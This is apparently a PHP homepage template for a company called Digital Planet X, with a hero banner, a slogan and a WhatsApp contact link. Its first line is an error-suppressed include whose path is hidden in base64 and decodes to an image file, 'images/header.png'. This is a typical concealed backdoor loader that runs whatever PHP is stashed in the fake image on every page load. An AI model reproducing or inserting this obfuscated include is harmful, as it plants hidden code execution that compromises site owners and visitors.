<?php
@include base64_decode('aW1hZ2VzL2hlYWRlci5wbmc='); 
	include 'includes/header.php'
?>
	  <section id="home-section" class="hero">
	  	<h3 class="vr">Welcome to Digital Planet X</h3>
	        ...
	        <div class="container-fluid p-0">
	          <div class="row d-md-flex no-gutters slider-text js-fullheight align-items-center justify-content-end" data-scrollax-parent="true">
		          ...
		          <div class="one-forth d-flex js-fullheight align-items-center ftco-animate" data-scrollax=" properties: { translateY: '70%' }">
		          	<div class="text">
		          		<span class="subheading">Welcome to Digital PlanetX</span>
			            <h1 class="mb-4 mt-3">Be <span>Digitally</span> Ahead  With A <span>Global Edge...</span></h1>
			            <p>We are professionals, and our solutions are simply the best.</p>
			            
			            <p><a href="https://api.whatsapp.com/send?phone=2348128977744" class="btn btn-primary px-5 py-3 mt-3">Get in touch</a></p>
		            </div>
		          </div>
	        	</div>
	        </div>
